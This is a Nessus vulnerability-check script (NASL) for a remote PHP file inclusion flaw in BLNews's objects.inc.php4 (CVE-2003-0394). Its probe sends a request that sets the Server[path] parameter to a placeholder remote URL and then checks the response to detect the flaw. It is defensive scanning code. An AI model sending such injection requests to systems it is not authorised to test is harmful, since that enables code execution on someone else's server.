#
# (C) Tenable Network Security, Inc.
#
# Ref:
#
# Date: Thu, 22 May 2003 14:42:13 +0400
# From: Over_G <overg@mail.ru>
# To: bugtraq@securityfocus.com
# Subject: PHP source code injection in BLNews


include("compat.inc");


if(description)
{
 script_id(11647);
 script_bugtraq_id(7677);
 script_cve_id("CVE-2003-0394");
 script_xref(name:"OSVDB", value:"4923");
 script_xref(name:"Secunia", value:"8864");
 script_version ("$Revision: 1.17 $");

 script_name(english:"BLNews objects.inc.php4 Server[path] Variable Remote File Inclusion");
 script_summary(english:"Checks for the presence of objects.inc.php4");

 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "The remote web application has a remote code execution vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "It is possible to make the remote host include remote PHP files\n",
     "using the BLnews CGI suite.\n\n",
     "A remote attacker may exploit this to execute arbitrary code with\n",
     "the privileges of the web server."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://marc.theaimsgroup.com/?l=bugtraq&m=105379530927567&w=2"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to the latest version of BLNews."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
 );
 script_end_attributes();

 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");
 
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port)) exit(0);



function check(loc)
{
 local_var r, w;
 w = http_send_recv3(item:string(loc, "/admin/objects.inc.php4?Server[path]=http://xxxxxx&Server[language_file]=nessus.php"),
 		method:"GET", port:port);			
 if (isnull(w)) exit(0);
 r = strcat(w[0], w[1], '\r\n', w[2]);
 if(egrep(pattern:".*http://xxxxxx/admin/nessus\.php", string:r))
 {
 	security_hole(port);
	exit(0);
 }
}



dirs = make_list(cgi_dirs());


foreach dir (dirs)
{
 check(loc:dir);
}
